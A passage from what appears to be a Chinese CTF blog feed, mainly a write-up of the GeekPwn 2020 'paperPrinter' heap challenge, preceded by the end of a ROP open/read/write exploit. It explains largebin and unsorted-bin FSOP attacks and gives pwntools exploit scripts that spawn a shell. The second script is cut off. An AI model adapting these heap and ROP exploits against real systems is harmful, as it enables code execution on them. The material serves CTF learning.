class="token comment" spellcheck="true"># pop rax; pop rdx; pop rbx; ret; </span>payload1<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000040b74a</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token comment" spellcheck="true"># pop rdi; pop rbp; ret; </span>payload1<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004014a4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6ed900</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rsi; ret;</span>payload1<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471115</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># syscall ret</span>payload1<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004005b5</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6ed900</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rsp; ret;</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ------------ ORW ---------------</span><span class="token comment" spellcheck="true"># open</span>payload2 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000482286</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rax; pop rdx; pop rbx; ret; </span>payload2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000040b74a</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6ed7d0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rdi; pop rbp; ret; </span>payload2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004014a4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rsi; ret; </span>payload2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471115</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># syscall ret</span><span class="token comment" spellcheck="true"># read</span>payload2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000482286</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rax; pop rdx; pop rbx; ret; </span>payload2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000040b74a</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rdi; pop rbp; ret; </span>payload2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004014a4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6ed7a0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rsi; ret; </span>payload2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471115</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># syscall ret</span><span class="token comment" spellcheck="true"># write</span>payload2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000482286</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rax; pop rdx; pop rbx; ret; </span>payload2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000040b74a</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rdi; pop rbp; ret; </span>payload2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000004014a4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6ed7a0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rsi; ret; </span>payload2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000471115</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># syscall ret</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串 </tag>
            
            <tag> 劫持malloc_hook </tag>
            
            <tag> 需要特殊的gadgets接大量ROP </tag>
            
            <tag> GeekPwn 2020 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-GeekPwn-paperPrinter</title>
      <link href="/2020/08/06/2020-geekpwn-paperprinter/"/>
      <url>/2020/08/06/2020-geekpwn-paperprinter/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-查看文件"><a href="#0x01-查看文件" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h1><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-paperprinter/0.png"></div>保护全开# 0x02 IDA分析随机化开辟一块地址：<div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-paperprinter/1.png"></div>这道题的整体思路有点像，同样的可以无限的编辑溢出，但是区别是这里只有两次malloc的机会。两次malloc第一次是可以malloc，第二次是再exitFunc函数中有个strdup函数会malloc一次。同时没有输出函数，程序一开始给了中间两位地址，那么我们只能尝试低地址写了。create：<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-paperprinter/2.png"></div>delete：<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-paperprinter/3.png"></div>edit：<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-paperprinter/4.png"></div>exitFunc：<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-paperprinter/5.png"></div>大致看看strdup函数的功能：strdup()在内部调用了malloc()为变量分配内存，不需要使用返回的字符串时，需要用free()释放相应的内存空间，否则会造成内存泄漏。<h1 id="0x03-思路分析"><a href="#0x03-思路分析" class="headerlink" title="0x03 思路分析"></a>0x03 思路分析</h1><p>这里同样有两个思路：</p><h2 id="第一个思路："><a href="#第一个思路：" class="headerlink" title="第一个思路："></a>第一个思路：</h2><p>是利用largebin attack改掉stdout的vtable为chunk地址，vtable+0x38为onegadet。在调用printf函数的时候会得到一次call [vtable+0x38]的机会，同时stdout文件结构体地址作为第一个参数传入。（这是第一次见到这种攻击，虽然也是FSOP但是利用手法有差别，详情请看io_file攻击(三)）</p><p><strong>同样的由于该题禁了one_gadget，那么我们就得换另一个思路了，mdzz！</strong></p><h2 id="第二个思路："><a href="#第二个思路：" class="headerlink" title="第二个思路："></a>第二个思路：</h2><p>利用unsorted bin attack进行FSOP，类似第一个题目的操作。改io_file_list为fake io_file（main_arena），io_file指向chunk（fake io file），vtable指向chunk</p><p>构造起来也是挺麻烦，大概讲讲思路吧：</p><p><strong>第一步</strong>：根据泄露的信息找到我们需要的io_file_list、system地址<br><strong>第二步</strong>：创造出足够多的空间，准备后面的delete构造small 、unsorted chunk<br><strong>第三步</strong>：根据fake file的特点在对应的位置创造出heap地址和libc地址，libc地址方便直接删除得到unsorted bin就有了，但是heap地址我们需要在offset + 0x8位置创造出要么就是unsorted bin要么就是smallbin，large bin。在这里我们选择smallbin，由于malloc的时候遍历unsorted bin会归类smallbin，所以提前释放两个同样大小的chunk在unsorted bin，malloc 0x150的时候就可以在对应的位置得到heap地址了。（这是最麻烦的一步了）<br><strong>第四步</strong>：unsorted bin attack + 改掉unsorted bin的size为0x61也为了劫持io_file_list成功，exit完成unsorted bin attack攻击，同时归类时产生错误执行malloc_printerr</p><h1 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h1><h2 id="exp（思路一）"><a href="#exp（思路一）" class="headerlink" title="exp（思路一）"></a>exp（思路一）</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>length<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">extra</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = process("PaperPrinter")</span><span class="token comment" spellcheck="true"># p = remote("183.60.136.226",16145)</span>sleep_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"30"</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0xa00000</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>sleep_addr<span class="token punctuation">)</span>stdout_vtable <span class="token operator">=</span> sleep_addr<span class="token operator">+</span><span class="token number">0x2f94c8</span>one_gadget <span class="token operator">=</span> sleep_addr<span class="token number">-0xcc230</span><span class="token operator">+</span><span class="token number">0x4526a</span>dl_open_hook <span class="token operator">=</span> stdout_vtable<span class="token operator">+</span><span class="token number">0x3be8</span>magic_gadget <span class="token operator">=</span> stdout_vtable<span class="token number">-0xdd26f8</span><span class="token operator">+</span><span class="token number">0xa7a98a</span>system <span class="token operator">=</span> sleep_addr<span class="token number">-0x86ea0</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x411</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh;"</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x221</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x221</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x110</span>edit<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x411</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0xb0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x2e0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token operator">+</span><span class="token number">0x180</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0x440</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0x480</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0x5a0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3f1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token punctuation">(</span>stdout_vtable<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>stdout_vtable<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>stdout_vtable<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x100</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">"/bin/sh;"</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x100</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0x440</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>extra<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp（思路二）"><a href="#exp（思路二）" class="headerlink" title="exp（思路二）"></a>exp（思路二）</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'info'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'183.60.136.226'</span><span class="token punctuation">,</span><span class="token number">16145</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>sz<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your choice:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input the offset :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input the length :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input the content :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your choice:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your choice:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input the offset :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token 